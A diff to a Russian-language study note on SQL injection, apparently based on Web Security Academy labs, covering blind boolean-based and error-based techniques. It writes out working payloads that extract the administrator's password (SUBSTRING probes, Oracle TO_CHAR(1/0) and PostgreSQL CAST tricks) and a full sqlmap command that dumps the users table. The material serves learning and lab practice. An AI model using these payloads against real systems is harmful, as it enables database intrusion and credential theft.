@@ -40,5 +40,33 @@ SQL-инъекция - это уязвимость веб-безопасност
 Слепая SQLi (blind SQLi) возникает, когда приложение уязвимо к SQLi, но HTTP-ответы приложения не содержат результаты выполнения SQLi или ошибок БД.
 #### Blind SQLi на основе условных ответов
 Если атакующий может управлять условием, от выполнения которого зависит ответ приложения (если `true` - один ответ, если `false`- другой ответ), он может реализовать Blind SQLi. Обычно атака реализуется путем перебора всех символов строки, которая интересует атакующего. Если символов содержится в строке на определенном месте, приложение отвечает одним образом. Если не содержится, другим. 
-Пример SQLi: `' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a` (условие проверяет, что первый символ пароля администратора - символ `a`). 
-Пример запроса sqlmap: `sqlmap -u 'https://0a6c007e03a064fd8180ac2300c60091.web-security-academy.net/' --cookie='TrackingId=RO861hCz137UK4MN; session=6Wx5XJtrM4qzOZTEMFclYvojlja92S3q' -p 'TrackingId' --param-filter='COOKIE' --skip='session' --level=2 --dbms=postgresql -D public -T users -C password --where="username='administrator'" --dump` (дамп пароля администратора из таблицы `users` схемы `public` через SQLi в куки `TrackingId`).
+Пример SQLi (условие проверяет, что первый символ пароля администратора - символ `a`) : 
+```sql
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a
+``` 
+Пример запроса sqlmap (дамп пароля администратора из таблицы `users` схемы `public` через SQLi в куки `TrackingId`): 
+```bash
+sqlmap -u 'https://0a6c007e03a064fd8180ac2300c60091.web-security-academy.net/' --cookie='TrackingId=RO861hCz137UK4MN; session=6Wx5XJtrM4qzOZTEMFclYvojlja92S3q' -p 'TrackingId' --param-filter='COOKIE' --skip='session' --level=2 --dbms=postgresql -D public -T users -C password --where="username='administrator'" --dump
+``` 
+### Error-based
+SQLi на основе ошибок (error-based) возникает, когда атакующий может использовать сообщения об ошибках для получения конфиденциальных данных из БД.
+#### Error-based SQLi на основе условных ошибок
+Атакующий может отправлять SQL-запрос, который вызовет ошибку БД при выполнении условия. Часто приложение ведет себя иначе при появлении необработанной ошибки БД, что будет указывать на истинность условия. 
+Запросы для проверки наличия Error-based SQLi (первый запрос - нет ошибки, второй запрос - ошибка):
+```sql
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+```
+Пример SQLi для Oracle (если первый символ пароля администратора равен `a`, то условие будет ошибка (`1/0`), иначе условие будет верным (`A=A`): 
+```sql
+' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'A' END FROM dual)='A;
+```
+#### Error-based SQLi на основе сообщений ошибок
+Некоторые ошибки БД могут выводить данные. 
+Примеры SQLi для PostgreSQL (получение первого значения из колонки `password` таблицы `users`): 
+```sql
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+```sql
+' AND 1=(SELECT password FROM users LIMIT 1)::int--
+```
